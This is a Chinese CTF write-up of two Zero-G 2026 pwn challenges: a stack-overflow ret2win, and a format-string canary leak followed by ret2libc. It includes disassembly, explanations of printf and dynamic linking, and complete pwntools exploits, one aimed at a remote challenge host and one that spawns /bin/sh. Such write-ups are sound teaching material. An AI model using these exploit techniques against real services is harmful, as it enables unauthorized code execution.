---
title: Zero-G_2026
description: Zero-G_2026 不过是二进制相关的，也都丢到对应的栏目了
date: 2026-05-24 18:20:50
updated: 2026-05-24 18:20:50
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260524104451_f9f3eea1-858c-4481-b8cf-9a376eb64618.png
categories: [比赛]
tags: [CTF, Zero-G, pwn, ret2shellcode, ret2libc, canary]
---

# Zero-G 2026

::alert{type="question"}
[附件下载,点击链接跳转](https://gitee.com/ASUS_HACKED/cybersecurity/tree/%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/Zero-G_2026)

::

## [Zero-G 2026] pwn1-Starport Ret2win

简单的栈溢出,ret2shellcode

### 0x01 分析程序

该程序为64位程序 
发现栈溢出read读取超过buf数组。



```c
int vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("ZeroG Starport Maintenance Console");
  puts("Input access token:");
  read(0, buf, 0xC8uLL);
  return puts("[-] Access token rejected.");
}
```

win函数发现cat flag

```c
void __noreturn win()
{
  const char *s; // [rsp+8h] [rbp-8h]

  s = getenv("GZCTF_FLAG");
  puts("[+] Maintenance channel unlocked.");
  if ( s && *s )
    puts(s);
  else
    puts("flag{local_test_flag}");
  fflush(stdout);
  _exit(0);
}
```

---

### 0x02 攻击链EXP



```python
from pwn import *
context(os='linux',arch='amd64',log_level = 'debug')

#r = process('./starport_ret2win')
r = remote('43.108.37.178',33349)
win = 0x04011E2
offset = 72
ret = 0x04012EB

payload = b'a'*offset+p64(ret)+p64(win)
#gdb.attach(r)
r.sendline(payload)
r.interactive()
```



## [Zero-G 2026]pwn2-Format Station

### 0x01 题目分析

#### 文件信息

```asm
format_station: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

保护全开，但没有PIE，所以代码段地址固定。

---



#### 反汇编分析

##### **main函数**

```asm
main:
  call init_io        ; 关闭缓冲
  call vuln           ; 漏洞函数
```

##### **vuln函数（关键）**

![img](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154553302-1277060360.png)

```asm
vuln:
  sub rsp, 0xe0
  mov [rbp-0x8], canary     ; 存储canary
  call read_canary           ; 从TLS读取canary到rax
  mov [rbp-0xe0], rax       ; 保存canary值

  ; 打印提示
  puts "ZeroG Format Station"
  puts "Send your format beacon:"

  ; 第一次read：格式化字符串漏洞
  lea rsi, [rbp-0x90]       ; 缓冲区1（format beacon）
  mov rdx, 0x7f             ; 最多读127字节
  call read

  ; printf漏洞！
  mov rdi, [rbp-0x90]       ; 格式字符串
  mov rsi, [rbp-0xe0]       ; 参数1 = canary
  mov rdx, 0x401080         ; 参数2 = puts@plt地址
  call printf               ; 格式化字符串漏洞！

  puts "Send your access packet:"

  ; 第二次read：栈溢出
  lea rsi, [rbp-0xd0]       ; 缓冲区2（access packet）
  mov rdx, 0x100            ; 最多读256字节
  call read

  ; canary检查 + 返回
  leave
  ret
```

---



#### 栈布局

```asm
[rbp-0xe0]  canary值（read_canary返回值）
[rbp-0xd0]  缓冲区2（access packet）← 第二次read
[rbp-0x90]  缓冲区1（format beacon）← 第一次read（printf格式字符串）
[rbp-0x8]   canary备份
[rbp]       saved rbp
[rbp+0x8]   返回地址
```

**偏移量计算：**

- 缓冲区2 → canary：0xd0 - 0x8 = 0xc8
- 缓冲区2 → 返回地址：0xd0 + 0x8 = 0xd8

---

### 0x02 漏洞点

1. **格式化字符串漏洞**：`printf(buffer, canary, puts@plt)` — 用户输入的buffer作为格式字符串
2. **栈溢出**：第二次read读取0x100字节到0xd0大小的缓冲区，可以覆盖返回地址

---



### 0x03 利用思路

#### 阶段1：泄露canary

利用格式化字符串`%1$016lx`泄露canary（printf的第一个参数）。

```
输入: %1$016lx.%2$p
输出: d48ad7a33fbf2400.0x401080
         ↑canary        ↑puts@plt（固定地址，无用）
```

---



##### 扩展printf参数打印调用

::alert{type="question"}
为什么必须使用%格式化字符串才能打印出canary和puts的数据
::

因为 printf 是用可变参数（variadic arguments）实现的

在 x86-64 上，函数调用时参数放在寄存器里：

```c  
printf(fmt, canary, puts@plt)
          ↓      ↓        ↓
         rdi    rsi      rdx
```

printf 内部的逻辑大致是这样的：

```c
 void printf(const char *fmt, ...) {
      va_list args;
      va_start(args, fmt);    // args 指向 rsi（canary）的位置

      while (*fmt) {
          if (*fmt == '%' && *(fmt+1) == 'd') {
              int val = va_arg(args, int);  // 从 args 位置取一个值，然后 args 往后移
              print_int(val);
          } else if (*fmt == '%' && *(fmt+1) == 's') {
              char *s = va_arg(args, char*);
              print_string(s);
          } else {
              putchar(*fmt);  // 普通字符直接输出，不读参数
          }
          fmt++;
      }
  }
```

- va_start(args, fmt) 让 args 指向 rsi 寄存器的位置（canary）
  - 每遇到一个 % 格式符，va_arg 就从 args 读取下一个值，然后指针后移
  - 普通字符直接输出，不读参数
- 所以：
  - 输入 "hello" → 遍历完所有字符，一次都没调用 va_arg，canary 和 puts 根本没被读取
  - 输入 "%1$lx" → 调用 va_arg，从 rsi（canary）的位置读出值并打印

---

printf 的缺陷：

       1. 它不检查格式化字符串要求的参数数量是否和实际传入的一致
       2. 它不检查格式化字符串是否来自可信来源
       3. 它只是机械地按 % 符号从寄存器/栈上取值



---



#### 阶段2：泄露libc地址

用canary + ROP调用`puts(puts@GOT)`，泄露puts在libc中的真实地址。

```
ROP链: padding(0xc8) + canary + padding(8) + pop_rdi_ret + puts@GOT + puts@plt + main
```

为什么返回main而不是vuln？因为返回vuln时rbp是垃圾值，vuln内部的`mov [rbp-0xe0], rax`会写入无效地址导致SIGSEGV。

---



#### 阶段3：计算libc基址 + ret2system

```
libc_base = puts真实地址 - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + 下一个"/bin/sh"的偏移
```

ROP链需要一个`ret`做栈对齐（16字节对齐要求）：

```
ROP链: padding(0xc8) + canary + padding(8) + ret + pop_rdi_ret + bin_sh + system
```

---

#### 阶段4：链接动态数据

::alert{type="question"}
为什么要动态链接？
::



因为程序编译时，puts、printf、system 这些函数不在你的程序里，它们在 libc.so.6
  这个库里。

  静态链接 vs 动态链接

  静态链接: 把 libc 的代码整个复制到你的程序里
            程序体积大，但可以独立运行

  动态链接: 程序里只留一个"占位符"，运行时再去 libc.so.6 里找真正的代码
            程序体积小，多个程序可以共享同一个 libc

  本题为什么必须用动态链接

  看一下程序里的调用：

```python
  printf(buf, canary, puts@plt);
  //      ↓
  //      puts@plt 这个地址在程序自己的代码段里
  //      但真正的 puts 代码在 libc.so.6 里
```



  动态链接的机制：

  程序里的 puts@plt（0x401080）:
      这不是真正的 puts 函数
      这是一个"跳板"，里面只有一条 jmp 指令
      跳到 GOT 表里记录的真实地址

  GOT 表（puts@GOT）:
      程序第一次调用 puts@plt 时
      动态链接器（ld-2.36.so）把 puts 在 libc 里的真实地址填到这里
      以后每次调用就直接跳过去

```
  程序调用 puts
      ↓
  进入 puts@plt（跳板，固定地址 0x401080）
      ↓
  查 GOT 表（存着 puts 的真实 libc 地址）
      ↓
  跳转到 libc.so.6 里的 puts 真实代码
      ↓
  执行 puts，返回

  本题的利用原理

  正是因为动态链接，GOT 表里存着 libc 的真实地址，我们才能泄露
```

```
阶段2: ROP 调用 puts(puts@GOT)
         ↓
         GOT 表里存着: 0x7f1234567980（puts 在 libc 中的真实地址）
         ↓
         把这个值泄露出来
         ↓
  阶段3: libc_base = 0x7f1234567980 - libc中puts的偏移
         system = libc_base + system的偏移
         /bin/sh = libc_base + /bin/sh的偏移
```

  如果程序是静态链接的，就没有 GOT 表，就没有办法通过泄露 GOT 来获取 libc
  基址，ret2libc 攻击就做不了。

---

##### 动态链接的完整流程

```
 你敲 ./format_station
      ↓
  内核加载程序到内存
      ↓
  看到程序头部写着: "我要 ld-2.36.so 来帮我链接"
      ↓
  内核先加载 ld-2.36.so（动态链接器）
      ↓
  把控制权交给 ld-2.36.so
      ↓
  ld-2.36.so 做这些事:
      1. 加载 libc.so.6 到内存
      2. 找到 puts、printf、system 在 libc 里的地址
      3. 把这些地址填到程序的 GOT 表里
      4. 跳到程序的 main 开始执行
      ↓
  程序运行时:
      调用 puts@plt → 查 GOT 表 → 跳到 libc 里的 puts
```

  动态链接器是什么？



  动态链接器 = ld-2.36.so（一个特殊的可执行文件）

  它的作用:
      在程序启动时，把 libc.so.6 加载进来
      把函数的真实地址填到 GOT 表
      让程序能正常调用 libc 函数

---

  为什么要 patchelf?

  ```
原程序写的: "我要 /lib64/ld-linux-x86-64.so.2"
                  ↑ 系统默认的动态链接器
  ```



  但本题给的 libc 是 2.36 版本
  系统默认的链接器可能是其他版本
  版本不匹配 → 地址算错 → exploit 崩溃

  所以:

```bash
patchelf --set-interpreter ./ld-2.36.so format_station
      ↓
      改成: "我要当前目录下的 ld-2.36.so"
      ↓
      保证链接器和 libc 版本一致
```

​     

  总结

  程序启动需要两样东西:
      1. format_station（程序本身）
      2. ld-2.36.so（动态链接器，负责加载 libc 并填 GOT 表）

  patchelf 的作用:
      告诉程序 "用这个 ld-2.36.so 来链接，别用系统的"
      避免链接器版本和 libc 版本不匹配

  没有动态链接器，程序启动时就不知道去哪找 libc，GOT 表也不会被填充，调用 libc
  函数就会崩溃。

---

##### 几种方法确认连接器版本

方法1：readelf

```bash
readelf -l format_station | grep interpreter
```



输出：

```lua
[Requesting program interpreter: ./ld-2.36.so]
```

方法2：file

file format_station

输出里会有一段：
interpreter ./ld-2.36.so

方法3：直接看程序头部

readelf -l format_station

输出：

```lua
Program Headers:
 Type           Offset             VirtAddr           PhysAddr
                FileSiz            MemSiz              Flags  Align
 INTERP         0x0000000000000318 0x0000000000400318 0x0000000000400318
                0x000000000000001c 0x000000000000001c  R      0x1
     [Requesting program interpreter: ./ld-2.36.so]
                   ↑ 这就是它要的动态链接器
```

本题的情况

原程序要求的链接器: ./ld-2.36.so（已经用 patchelf 设置好了）

如果没 patchelf，一般会是:
   /lib64/ld-linux-x86-64.so.2     （64位系统默认）
   /lib/ld-linux.so.2              （32位系统默认）

什么时候需要 patchelf

readelf -l 看到的链接器    实际目录下的链接器     需要patchelf吗  ─────────────────────────────────────────────────────────────
/lib64/ld-linux-x86-64.so.2   系统有这个             不需要
./ld-2.36.so                  当前目录有这个          不需要（已设置好）
/lib64/ld-linux-x86-64.so.2   只有 ./ld-2.36.so      需要！



  一句话：拿到题先 readelf -l
  看链接器是什么，再看题目给的文件里有没有这个链接器，没有就用 patchelf 改。

```bash
readelf -l format_station | grep interpreter
```

![image-20260524153235110](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552908-948675362.png)

好问题，现在我怎么确定是什么系统版本的呢？

看一下题目给的libc

```bash
strings libc.so.6 | grep "stable release"
```

![image-20260524153550214](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552554-1932717418.png)

知道是 Debian 12 + glibc 2.36 后：

用 glibc-all-in-one 工具

```bash
git clone https://github.com/nickglibc/glibc-all-in-one.git
cd glibc-all-in-one
./build 2.36
```

>实际流程
>
>第一步：自己确认 libc 版本
>
>
>
>strings libc.so.6 | grep "GLIBC"
>
>
>
>输出: GLIBC 2.36
>
>
>
>第二步：告诉 glibc-all-in-one 要 2.36
>
>
>
>./download 2.36       # 下载预编译好的 或  ./build 2.36          # 自己编译
>
>
>
>第三步：它会下载对应的 ld.so 和 libc.so.6 到某个目录
>
>你再拷出来用
>
>



也可以用libc.rip

::alert{icon="ph:files-duotone" color="var(--c-accent)" title="libc查询"}

https://libc.rip/

::






### 0x04 完整Exploit

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./format_station')
libc = ELF('./libc.so.6')

r = process('./format_station')

ret = 0x4013bc
offset = 0xc8
pop_rdi_ret = 0x4011fc

# 阶段1：泄露canary
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$016lx.%2$p")
line = r.recvline().strip()
canary = int(line.split(b'.', 1)[0], 16)
print("[+]canary->", hex(canary))

# 阶段2：泄露puts真实地址
r.recvuntil(b"Send your access packet:\n")
payload_2 = b'a' * offset
payload_2 += p64(canary)
payload_2 += b'b' * 8
payload_2 += p64(pop_rdi_ret)
payload_2 += p64(elf.got['puts'])
payload_2 += p64(elf.plt['puts'])
payload_2 += p64(0x4013bd)  # 返回main
r.sendline(payload_2)

r.recvuntil(b"[-] packet rejected\n")
puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
print("[+]puts->", hex(puts_leak))

# 阶段3：ret2system
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$p")
r.recvuntil(b"Send your access packet:\n")

libc.address = puts_leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload_3 = b'a' * offset
payload_3 += p64(canary)
payload_3 += b'b' * 8
payload_3 += p64(ret)          # 栈对齐
payload_3 += p64(pop_rdi_ret)
payload_3 += p64(bin_sh)
payload_3 += p64(system)
r.sendline(payload_3)

r.interactive()
```

![image-20260524152516373](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154551732-1434354838.png)

 

```md wrap
<!-- 你可以在此处书写大纲，并在上方完成文章 -->
```
